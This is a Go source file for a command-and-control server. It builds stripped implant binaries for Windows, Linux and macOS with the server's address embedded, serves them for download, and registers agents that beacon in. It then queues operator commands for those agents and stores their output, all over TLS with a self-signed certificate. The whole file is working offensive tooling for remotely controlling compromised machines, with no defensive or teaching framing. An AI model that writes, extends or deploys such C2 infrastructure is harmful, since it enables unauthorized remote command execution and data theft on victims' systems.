package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"embed"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
)

//go:embed agent_template/main.go
var agentTemplate embed.FS

// Define a custom type for our context key to avoid collisions.
type contextKey string

const authContextKey = contextKey("auth")

// --- Globals ---
var sslCertFile = "server_public.pem"
var sslKeyFile = "server_private.pem"

var db *sql.DB
var config Config

// --- Structs ---
type Config struct {
	URL           string `json:"url"`
	Port_C2       string `json:"port_c2"`
	Port_Download string `json:"port_download"`
	APIKey        string `json:"api_key"`
}
type RegisterRequest struct {
	Hostname  string `json:"hostname"`
	PublicKey string `json:"public_key"`
}
type RegisterResponse struct {
	UUID uuid.UUID `json:"uuid"`
}
type Agent struct {
	UUID     string    `json:"uuid"`
	Hostname string    `json:"hostname"`
	LastSeen time.Time `json:"last_seen"`
}
type TaskRequest struct {
	UUID    string `json:"uuid"`
	Command string `json:"command"`
}
type TaskResponse struct {
	TaskID string `json:"task_id"`
}
type ResultRequest struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
}
type BeaconTask struct {
	TaskID  string `json:"task_id"`
	Command string `json:"command"`
}
type ResultResponse struct {
	Status string `json:"status"`
	Result string `json:"result"`
}

func main() {
	var err error
	config, err = loadOrGenerateConfig()
	if err != nil {
		log.Fatalf("Error with config: %v", err)
	}

	if err := loadOrGenerateCerts(); err != nil {
		log.Fatalf("Error with certificates: %v", err)
	}

	if err := buildAgents(config); err != nil {
		log.Fatalf("Error building agents: %v", err)
	}

	db, err = sql.Open("sqlite3", "./agents.db?_foreign_keys=on")
	if err != nil {
		log.Fatalf("Error opening database: %v", err)
	}
	defer db.Close()

	if err := initDB(); err != nil {
		log.Fatalf("Error initializing database: %v", err)
	}

	go server_files()
	server_c2()

}

func server_files() {
	serverAddr_dl := ":" + config.Port_Download
	dl_r := chi.NewRouter()

	// Public endpoint for agent builds
	fs := http.FileServer(http.Dir("./build"))
	dl_r.Handle("/download/*", http.StripPrefix("/download/", fs))
	log.Printf("File Server started")
	if err := http.ListenAndServe(serverAddr_dl, dl_r); err != nil {
		log.Fatalf("File Server failed to start: %v", err)
	}
}

func server_c2() {

	r := chi.NewRouter()

	// API endpoints with authentication for the commander
	r.Group(func(r chi.Router) {
		r.Use(apiKeyAuth)
		r.Get("/agents", listAgentsHandler)
		r.Post("/task", taskHandler)
		r.Get("/results/{taskID}", getResultHandler)
	})

	// Agent-facing endpoints (no commander auth needed)
	r.Post("/register", registerAgentHandler)
	r.Get("/beacon", beaconHandler)
	r.Post("/results", resultsHandler)

	serverAddr_C2 := ":" + config.Port_C2
	log.Printf("Server starting on %s...", serverAddr_C2)
	log.Printf("IMPORTANT: Your API Key is: %s", config.APIKey)
	log.Println("Copy this key into your commander.json config file.")
	log.Printf("C2 Server started")
	if err := http.ListenAndServeTLS(serverAddr_C2, sslCertFile, sslKeyFile, r); err != nil {
		log.Fatalf("C2 Server failed to start: %v", err)
	}
}

// --- Middleware ---
func apiKeyAuth(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		key := r.Header.Get("X-API-Key")
		if key == "" {
			http.Error(w, "API Key header missing", http.StatusUnauthorized)
			return
		}
		if key != config.APIKey {
			http.Error(w, "Invalid API Key", http.StatusUnauthorized)
			return
		}
		ctx := context.WithValue(r.Context(), authContextKey, "ok")
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}

// --- Handlers ---
func listAgentsHandler(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query("SELECT uuid, hostname, last_seen FROM agents ORDER BY last_seen DESC")
	if err != nil {
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var agents []Agent
	for rows.Next() {
		var agent Agent
		var lastSeen sql.NullTime
		if err := rows.Scan(&agent.UUID, &agent.Hostname, &lastSeen); err != nil {
			log.Printf("DB scan error: %v", err)
			continue
		}
		if lastSeen.Valid {
			agent.LastSeen = lastSeen.Time
		}
		agents = append(agents, agent)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

func taskHandler(w http.ResponseWriter, r *http.Request) {
	var req TaskRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	taskID := uuid.New().String()
	_, err := db.Exec("INSERT INTO tasks (task_id, agent_uuid, command, status, created_at) VALUES (?, ?, ?, ?, ?)",
		taskID, req.UUID, req.Command, "pending", time.Now())

	if err != nil {
		log.Printf("Error inserting task: %v", err)
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	log.Printf("Queued task %s for agent %s: %s", taskID, req.UUID, req.Command)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(TaskResponse{TaskID: taskID})
}

func getResultHandler(w http.ResponseWriter, r *http.Request) {
	taskID := chi.URLParam(r, "taskID")
	row := db.QueryRow("SELECT status, result FROM tasks WHERE task_id = ?", taskID)

	var status string
	var result sql.NullString
	if err := row.Scan(&status, &result); err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Task not found", http.StatusNotFound)
			return
		}
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	resp := ResultResponse{Status: status}
	if result.Valid {
		resp.Result = result.String
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	agentUUIDStr := r.URL.Query().Get("uuid")
	agentUUID, err := uuid.Parse(agentUUIDStr)
	if err != nil {
		http.Error(w, "Invalid or missing UUID", http.StatusBadRequest)
		return
	}

	// 1. Check if agent exists and properly handle the sql.ErrNoRows error.
	var hostname string
	err = db.QueryRow("SELECT hostname FROM agents WHERE uuid = ?", agentUUID.String()).Scan(&hostname)
	if err != nil {
		if err == sql.ErrNoRows {
			// 2. Use a non-fatal log and send a proper HTTP error.
			log.Printf("Beacon from unknown UUID: %s", agentUUID.String())
			http.Error(w, "Unauthorized: Unknown UUID", http.StatusUnauthorized)
		} else {
			// Handle other potential database errors
			log.Printf("Database error checking agent: %v", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		}
		// IMPORTANT: Return after handling the error.
		return
	}

	log.Printf("Received beacon from agent: %s (%s)", agentUUID, hostname)

	// 3. Update last_seen and check for the error.
	_, err = db.Exec("UPDATE agents SET last_seen = ? WHERE uuid = ?", time.Now(), agentUUID.String())
	if err != nil {
		log.Printf("Failed to update last_seen for agent %s: %v", agentUUID, err)
		// Decide if this is a fatal error. For now, we'll let it continue
		// but in a real app you might want to return an internal server error.
	}

	// 4. Check for a pending task.
	var task BeaconTask
	err = db.QueryRow("SELECT task_id, command FROM tasks WHERE agent_uuid = ? AND status = 'pending' ORDER BY created_at LIMIT 1", agentUUID.String()).Scan(&task.TaskID, &task.Command)

	// 5. Structure logic to send ONLY ONE response.
	if err != nil {
		if err == sql.ErrNoRows {
			// No task is pending, send 204 No Content.
			w.WriteHeader(http.StatusNoContent)
		} else {
			// A real database error occurred.
			log.Printf("Database error fetching task for agent %s: %v", agentUUID, err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		}
		return // Return here.
	}

	// If we get here, a task was found. Dispatch it.
	_, err = db.Exec("UPDATE tasks SET status = 'dispatched' WHERE task_id = ?", task.TaskID)
	if err != nil {
		log.Printf("Failed to update task status for agent %s: %v", agentUUID, err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK) // Explicitly set 200 OK
	json.NewEncoder(w).Encode(task)
	log.Printf("Dispatched task %s to agent %s", task.TaskID, agentUUID)
}

func resultsHandler(w http.ResponseWriter, r *http.Request) {
	var req ResultRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid results format", http.StatusBadRequest)
		return
	}

	_, err := db.Exec("UPDATE tasks SET status = 'complete', result = ? WHERE task_id = ?", req.Output, req.TaskID)
	if err != nil {
		log.Printf("Error updating task result: %v", err)
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	log.Printf("Received result for task %s", req.TaskID)
	w.WriteHeader(http.StatusOK)
}

func registerAgentHandler(w http.ResponseWriter, r *http.Request) {
	var req RegisterRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	newUUID := uuid.New()
	stmt, err := db.Prepare("INSERT INTO agents (uuid, hostname, public_key, last_seen) VALUES (?, ?, ?, ?)")
	if err != nil {
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()
	_, err = stmt.Exec(newUUID.String(), req.Hostname, req.PublicKey, time.Now())
	if err != nil {
		http.Error(w, "Server error", http.StatusInternalServerError)
		return
	}
	log.Printf("Registered new agent from hostname '%s' with UUID: %s", req.Hostname, newUUID)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(RegisterResponse{UUID: newUUID})
}

// --- Setup and Helper Functions ---
func initDB() error {
	agentTableStmt := `
    CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uuid TEXT NOT NULL UNIQUE,
        hostname TEXT NOT NULL,
        public_key TEXT NOT NULL,
        last_seen DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );`
	if _, err := db.Exec(agentTableStmt); err != nil {
		return err
	}

	taskTableStmt := `
	CREATE TABLE IF NOT EXISTS tasks (
		task_id TEXT PRIMARY KEY,
		agent_uuid TEXT NOT NULL,
		command TEXT NOT NULL,
		status TEXT NOT NULL,
		result TEXT,
		created_at DATETIME,
		FOREIGN KEY(agent_uuid) REFERENCES agents(uuid)
	);`
	_, err := db.Exec(taskTableStmt)
	return err
}

func loadOrGenerateConfig() (Config, error) {
	var config Config
	configFile := "server.conf"

	if _, err := os.Stat(configFile); os.IsNotExist(err) {
		log.Println("Config file not found. Generating new config...")
		resp, err := http.Get("https://ipinfo.io/ip")
		if err != nil {
			return config, fmt.Errorf("could not fetch public IP: %w", err)
		}
		defer resp.Body.Close()
		ip, err := io.ReadAll(resp.Body)
		if err != nil {
			return config, err
		}

		config.Port_C2 = "8443"
		config.Port_Download = "8080"
		config.URL = fmt.Sprintf("https://%s:%s", strings.TrimSpace(string(ip)), config.Port_C2)

		keyBytes := make([]byte, 32)
		if _, err := rand.Read(keyBytes); err != nil {
			return config, err
		}
		config.APIKey = fmt.Sprintf("%x", keyBytes)

		configData, _ := json.MarshalIndent(config, "", "  ")
		if err := os.WriteFile(configFile, configData, 0644); err != nil {
			return config, err
		}
		log.Printf("New config saved. Server URL set to: %s", config.URL)
	} else {
		configData, err := os.ReadFile(configFile)
		if err != nil {
			return config, err
		}
		if err := json.Unmarshal(configData, &config); err != nil {
			return config, err
		}
	}
	return config, nil
}

func loadOrGenerateCerts() error {
	if _, err := os.Stat(sslCertFile); os.IsNotExist(err) {
		log.Println("Generating self-signed certificate...")
		privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return err
		}

		template := x509.Certificate{
			SerialNumber: big.NewInt(1),
			Subject: pkix.Name{
				Organization: []string{"C2 Project"},
			},
			NotBefore:   time.Now(),
			NotAfter:    time.Now().AddDate(10, 0, 0), // Valid for 10 years
			KeyUsage:    x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
			ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			IPAddresses: []net.IP{net.ParseIP("127.0.0.1")},
			DNSNames:    []string{"localhost"},
		}

		derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
		if err != nil {
			return err
		}

		certOut, err := os.Create(sslCertFile)
		if err != nil {
			return err
		}
		pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
		certOut.Close()

		keyOut, err := os.Create(sslKeyFile)
		if err != nil {
			return err
		}
		pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})
		keyOut.Close()
		log.Println("New certificate and key saved.")
	}
	return nil
}

func buildAgents(config Config) error {
	log.Println("Starting agent build process...")
	buildDir := "./build"
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		return err
	}

	templateBytes, err := agentTemplate.ReadFile("agent_template/main.go")
	if err != nil {
		return err
	}
	templateCode := string(templateBytes)

	pubKeyPEM, err := os.ReadFile(sslCertFile)
	if err != nil {
		return fmt.Errorf("could not read server public key to embed: %w", err)
	}

	finalCode := strings.ReplaceAll(templateCode, "{{SERVER_URL}}", config.URL)
	finalCode = strings.ReplaceAll(finalCode, "{{SERVER_CERT}}", string(pubKeyPEM))

	tmpBuildDir, err := os.MkdirTemp("", "agent-build-*")
	if err != nil {
		return fmt.Errorf("could not create temp build dir: %w", err)
	}
	defer os.RemoveAll(tmpBuildDir)

	tmpGoFile := filepath.Join(tmpBuildDir, "agent.go")
	if err := os.WriteFile(tmpGoFile, []byte(finalCode), 0644); err != nil {
		return err
	}

	tmpGoModFile := filepath.Join(tmpBuildDir, "go.mod")
	if err := os.WriteFile(tmpGoModFile, []byte("module tempagent\n\ngo 1.22"), 0644); err != nil {
		return err
	}

	// Run 'go mod tidy' to fetch dependencies.
	log.Println("Running 'go mod tidy' for agent dependencies...")
	cmdTidy := exec.Command("go", "mod", "tidy")
	cmdTidy.Dir = tmpBuildDir // Run from the temp directory
	if output, err := cmdTidy.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to run go mod tidy: %s\n%w", string(output), err)
	}
	log.Println("'go mod tidy' completed.")

	targets := map[string]string{
		"windows/amd64": "agent.exe",
		"linux/amd64":   "agent",
		"darwin/amd64":  "agent_mac_intel",
		"darwin/arm64":  "agent_mac_apple_silicon",
	}

	for target, outputName := range targets {
		parts := strings.Split(target, "/")
		goos, goarch := parts[0], parts[1]

		absOutputPath, err := filepath.Abs(filepath.Join(buildDir, outputName))
		if err != nil {
			return fmt.Errorf("could not get absolute path for output: %w", err)
		}

		log.Printf("Building agent for %s...", target)

		cmdBuild := exec.Command("go", "build", "-ldflags", "-s -w", "-o", absOutputPath, ".")
		cmdBuild.Dir = tmpBuildDir
		cmdBuild.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0") // CGO_ENABLED=0 helps with cross-compilation

		if output, err := cmdBuild.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to build for %s: %s\n%w", target, string(output), err)
		}
	}

	log.Println("Agent builds completed successfully.")
	return nil
}
